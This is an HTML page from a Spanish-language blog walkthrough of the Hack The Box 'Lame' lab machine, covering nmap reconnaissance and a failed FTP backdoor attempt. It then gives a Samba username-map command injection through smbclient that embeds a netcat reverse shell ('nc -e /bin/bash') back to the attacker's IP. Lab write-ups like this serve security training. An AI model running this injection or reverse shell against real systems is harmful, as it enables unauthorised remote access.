@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Lame Hack The Box | TheMV</title>
+<meta name="keywords" content="">
+<meta name="description" content="La máquina Lame es la primera que lanzo Hack The Box, es de dificultad fácil y su sistema operativo es Linux.
+Dicho esto, comencemos.
+Fase de reconocimiento Lo primero que vamos a hacer es escanear todo el rango de puertos usando la herramienta nmap, con el siguiente comando.
+ sudo nmap -p- &ndash;open -sS &ndash;min-rate 5000 -n -v -Pn -oN puertos 10.10.10.3
+ Como podemos observar, el escaneo ya ha terminado, vamos a lanzar otro escaneo para detectar las versiones y servicios que corren para esos puertos">
+<meta name="author" content="">
+<link rel="canonical" href="https://the-m-v.github.io/posts/lame-htb/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://the-m-v.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://the-m-v.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://the-m-v.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://the-m-v.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://the-m-v.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Lame Hack The Box" />
+<meta property="og:description" content="La máquina Lame es la primera que lanzo Hack The Box, es de dificultad fácil y su sistema operativo es Linux.
+Dicho esto, comencemos.
+Fase de reconocimiento Lo primero que vamos a hacer es escanear todo el rango de puertos usando la herramienta nmap, con el siguiente comando.
+ sudo nmap -p- &ndash;open -sS &ndash;min-rate 5000 -n -v -Pn -oN puertos 10.10.10.3
+ Como podemos observar, el escaneo ya ha terminado, vamos a lanzar otro escaneo para detectar las versiones y servicios que corren para esos puertos" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://the-m-v.github.io/posts/lame-htb/" /><meta property="article:section" content="posts" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Lame Hack The Box"/>
+<meta name="twitter:description" content="La máquina Lame es la primera que lanzo Hack The Box, es de dificultad fácil y su sistema operativo es Linux.
+Dicho esto, comencemos.
+Fase de reconocimiento Lo primero que vamos a hacer es escanear todo el rango de puertos usando la herramienta nmap, con el siguiente comando.
+ sudo nmap -p- &ndash;open -sS &ndash;min-rate 5000 -n -v -Pn -oN puertos 10.10.10.3
+ Como podemos observar, el escaneo ya ha terminado, vamos a lanzar otro escaneo para detectar las versiones y servicios que corren para esos puertos"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Posts",
+      "item": "https://the-m-v.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Lame Hack The Box",
+      "item": "https://the-m-v.github.io/posts/lame-htb/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Lame Hack The Box",
+  "name": "Lame Hack The Box",
+  "description": "La máquina Lame es la primera que lanzo Hack The Box, es de dificultad fácil y su sistema operativo es Linux.\nDicho esto, comencemos.\nFase de reconocimiento Lo primero que vamos a hacer es escanear todo el rango de puertos usando la herramienta nmap, con el siguiente comando.\n sudo nmap -p- \u0026ndash;open -sS \u0026ndash;min-rate 5000 -n -v -Pn -oN puertos 10.10.10.3\n Como podemos observar, el escaneo ya ha terminado, vamos a lanzar otro escaneo para detectar las versiones y servicios que corren para esos puertos",
+  "keywords": [
+    
+  ],
+  "articleBody": "La máquina Lame es la primera que lanzo Hack The Box, es de dificultad fácil y su sistema operativo es Linux.\nDicho esto, comencemos.\nFase de reconocimiento Lo primero que vamos a hacer es escanear todo el rango de puertos usando la herramienta nmap, con el siguiente comando.\n sudo nmap -p- –open -sS –min-rate 5000 -n -v -Pn -oN puertos 10.10.10.3\n Como podemos observar, el escaneo ya ha terminado, vamos a lanzar otro escaneo para detectar las versiones y servicios que corren para esos puertos\nPara eso usaremos el siguiente comando\n nmap -p21,22,139,445,3632 -sCV -oN targeted 10.10.10.3\n ¡Bien! El escaneo finalizó y podemos ver que el puerto 21 ósea el FTP tiene activado el usuario de invitado, vamos a conectarnos para ver que hay.\nBueno, no hay nada interesante, vamos a ver si hay vulnerabilidades para la versión que está usando el servicio FTP.\nAl buscar vulnerabilidades para esa versión de FTP, nos lanza dos exploits para ejecuciones de comando, vamos a ver que hacen\nComo podemos ver, lo que hace el exploit es conectarse por FTP, en el campo de usuario coloca una :) y te deberia de dar una shell por el puerto 6200\nBueno, no es vulnerable, así que pasaremos con los siguientes puertos, recordemos que estaba el puerto 445 activado, donde corre el servicio Samba, vamos a ver si hay vulnerabilidades para su version\nVemos que hay un exploit para la versión que está utilizando el servicio Samba de ejecución remota de comandos, vamos a ver es lo que hace para ejecutar comandos.\nBásicamente lo que hace, es que en el campo de usuario al ponerle “/=`nohup” y el comando que queremos, ese se ejecutará, pongámoslo en práctica para mandarnos una Shell, para conectarnos usaremos la herramienta smbclient y el siguiente comando.\n smbclient //10.10.10.3/tmp -N –option=“client min protocol=NT1” -c ’logon “/=nohup nc -e /bin/bash [TU IP] 443”'\n Y listo, ya estamos en el sistema como Administradores.\nEspero que te haya sido de ayuda este post, próximamente subiré más, ¡Saludos!\n",
+  "wordCount" : "333",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://the-m-v.github.io/posts/lame-htb/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "TheMV",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://the-m-v.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://the-m-v.github.io" accesskey="h" title="TheMV (Alt + H)">TheMV</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://the-m-v.github.io/posts/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://the-m-v.github.io/herramientas/" title="Herramientas">
+                    <span>Herramientas</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://the-m-v.github.io/about/" title="Sobre mi">
+                    <span>Sobre mi</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      Lame Hack The Box
+    </h1>
+    <div class="post-meta">
+
+</div>
+  </header> 
+  <div class="post-content"><p>La máquina <strong>Lame</strong> es la primera que lanzo <a href="https://www.hackthebox.com/">Hack The Box</a>, es de dificultad fácil y su sistema operativo es Linux.</p>
+<p><img loading="lazy" src="https://i.postimg.cc/0jhggBy4/Lame.png" alt="Lame.png"  />
+</p>
+<p>Dicho esto, comencemos.</p>
+<h2 id="fase-de-reconocimiento">Fase de reconocimiento<a hidden class="anchor" aria-hidden="true" href="#fase-de-reconocimiento">#</a></h2>
+<p>Lo primero que vamos a hacer es escanear todo el rango de puertos usando la herramienta nmap, con el siguiente comando.</p>
+<blockquote>
+<p>sudo nmap -p- &ndash;open -sS &ndash;min-rate 5000 -n -v -Pn -oN puertos 10.10.10.3</p>
+</blockquote>
+<p><img loading="lazy" src="https://i.postimg.cc/YSNmvcc1/puertos.png" alt="puertos.png"  />
+</p>
+<p>Como podemos observar, el escaneo ya ha terminado, vamos a lanzar otro escaneo para detectar las versiones y servicios que corren para esos puertos</p>
+<p>Para eso usaremos el siguiente comando</p>
+<blockquote>
+<p>nmap -p21,22,139,445,3632 -sCV -oN targeted 10.10.10.3</p>
+</blockquote>
+<p><img loading="lazy" src="https://i.postimg.cc/Bbprbnpd/versiones-Yservicios.png" alt="versiones-Yservicios.png"  />
+</p>
+<p>¡Bien! El escaneo finalizó y podemos ver que el puerto 21 ósea el FTP tiene activado el usuario de invitado, vamos a conectarnos para ver que hay.</p>
+<p><img loading="lazy" src="https://i.postimg.cc/T3fZmmFB/ftp.png" alt="ftp.png"  />
+</p>
+<p>Bueno, no hay nada interesante, vamos a ver si hay vulnerabilidades para la versión que está usando el servicio FTP.</p>
+<p><img loading="lazy" src="https://i.postimg.cc/cHPJ4TDp/ftpVuln.png" alt="ftpVuln.png"  />
+</p>
+<p>Al buscar vulnerabilidades para esa versión de FTP, nos lanza dos exploits para ejecuciones de comando, vamos a ver que hacen</p>
+<p><img loading="lazy" src="https://i.postimg.cc/Pf4Svcbz/Captura-de-pantalla-2022-05-28-143608.png" alt="Captura-de-pantalla-2022-05-28-143608.png"  />
+</p>
+<p>Como podemos ver, lo que hace el exploit es conectarse por FTP, en el campo de usuario coloca una <strong>:)</strong> y te deberia de dar una shell por el puerto 6200</p>
+<p><img loading="lazy" src="https://i.postimg.cc/kgdv5PDy/unknown.png" alt="unknown.png"  />
+</p>
+<p>Bueno, no es vulnerable, así que pasaremos con los siguientes puertos, recordemos que estaba el puerto 445 activado, donde corre el servicio Samba, vamos a ver si hay vulnerabilidades para su version</p>
+<p><img loading="lazy" src="https://i.postimg.cc/g2HzC8fK/smbVuln.png" alt="smbVuln.png"  />
+</p>
+<p>Vemos que hay un exploit para la versión que está utilizando el servicio Samba de ejecución remota de comandos, vamos a ver es lo que hace para ejecutar comandos.</p>
+<p><img loading="lazy" src="https://i.postimg.cc/76mTwjdm/si.png" alt="si.png"  />
+</p>
+<p>Básicamente lo que hace, es que en el campo de usuario al ponerle &ldquo;/=`nohup&rdquo; y el comando que queremos, ese se ejecutará, pongámoslo en práctica para mandarnos una Shell, para conectarnos usaremos la herramienta smbclient y el siguiente comando.</p>
+<blockquote>
+<p>smbclient //10.10.10.3/tmp -N &ndash;option=&ldquo;client min protocol=NT1&rdquo; -c &rsquo;logon &ldquo;/=<code>nohup nc -e /bin/bash [TU IP] 443</code>&rdquo;'</p>
+</blockquote>
+<p><img loading="lazy" src="https://i.postimg.cc/RFytqhcq/unknown.png" alt="unknown.png"  />
+</p>
+<p>Y listo, ya estamos en el sistema como Administradores.</p>
+<p><strong>Espero que te haya sido de ayuda este post, próximamente subiré más, ¡Saludos!</strong></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://the-m-v.github.io">TheMV</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
